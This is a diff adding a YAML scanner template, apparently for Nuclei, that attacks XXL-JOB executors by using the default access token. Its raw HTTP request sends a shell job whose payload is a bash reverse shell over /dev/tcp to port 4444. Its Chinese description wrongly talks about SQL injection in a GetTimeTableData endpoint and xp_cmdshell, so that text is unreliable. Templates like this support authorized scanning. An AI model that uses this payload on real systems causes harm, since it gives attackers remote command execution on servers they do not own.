@@ -1,0 +1,52 @@
+id: XXL-JOB-default-accessToken-bypass
+
+info:
+  name: XXL-JOB默认accessToken身份认证绕过
+  author: Xinyi
+  severity: high
+  description: |-
+          GetTimeTableData 接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://github.com/xuxueli/xxl-job
+  tags: RCE
+
+http:
+  - raw:
+      - |       
+        POST /run HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Host: 
+        Content-Type: application/json
+        XXL-JOB-ACCESS-TOKEN: default_token
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 375
+
+
+        {
+        "jobId": 2,
+        "executorHandler": "demoJobHandler",
+        "executorParams": "demoJobHandler",
+        "executorBlockStrategy": "SERIAL_EXECUTION",
+        "executorTimeout": 0,
+        "logId": 1,
+        "logDateTime": 1586373637819,
+        "glueType": "GLUE_SHELL",
+        "glueSource": "bash -i >& /dev/tcp/ip/4444 0>&1",
+        "glueUpdatetime": 1586693836766,
+        "broadcastIndex": 0,
+        "broadcastTotal": 0
+        }       
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
